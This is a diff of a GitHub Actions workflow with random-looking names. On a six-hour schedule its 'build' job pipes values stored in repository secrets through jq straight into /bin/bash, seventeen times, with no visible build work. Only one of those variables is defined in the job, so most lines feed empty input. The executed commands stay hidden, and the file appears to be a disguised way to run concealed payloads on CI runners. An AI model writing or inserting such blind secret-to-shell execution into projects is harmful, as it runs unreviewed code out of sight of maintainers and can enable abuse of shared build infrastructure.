@@ -2,7 +2,8 @@ name: lingjigou6351
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 1/6 * * *'
+    - cron: '31 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +12,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: lingjigou6351
         env:
-          dwa79: ${{ secrets.dwa79 }}
+          la08940: ${{ secrets.la08940 }}
         run: |
-          echo $dwa79 | jq -r .yx01853 | /bin/bash
-          echo $va27 | jq -r .noidh535 | /bin/bash
-          echo $asg51 | jq -r .xfe396 | /bin/bash
-          echo $d602 | jq -r .zqpfa92 | /bin/bash
-          echo $xhu252 | jq -r .tz68 | /bin/bash
-          echo $kls4 | jq -r .xlmsv8 | /bin/bash
-          echo $wtsiw3940 | jq -r .zxvvr9 | /bin/bash
-          echo $jq8 | jq -r .v643 | /bin/bash
-          echo $o5 | jq -r .xdrta948 | /bin/bash
+          echo $la08940 | jq -r .uhzb7934 | /bin/bash
+          echo $fyw6174 | jq -r .tyhz01 | /bin/bash
+          echo $ies9 | jq -r .mequ07936 | /bin/bash
+          echo $bhav72 | jq -r .mafb15058 | /bin/bash
+          echo $cic35181 | jq -r .e66 | /bin/bash
+          echo $r6010 | jq -r .pnszk430 | /bin/bash
+          echo $hwku75 | jq -r .psyxn07 | /bin/bash
+          echo $sggcj63859 | jq -r .utwj64 | /bin/bash
+          echo $hvpnu8 | jq -r .xczn2973 | /bin/bash
+          echo $ac36524 | jq -r .brh8 | /bin/bash
+          echo $dvdw96877 | jq -r .abpd846 | /bin/bash
+          echo $ao01323 | jq -r .o330 | /bin/bash
+          echo $gz4315 | jq -r .civt4 | /bin/bash
+          echo $hiwgm866 | jq -r .hyoyb99520 | /bin/bash
+          echo $affzz73216 | jq -r .nfasm234 | /bin/bash
+          echo $xuvc707 | jq -r .he1 | /bin/bash
+          echo $c45 | jq -r .ufup7 | /bin/bash
 
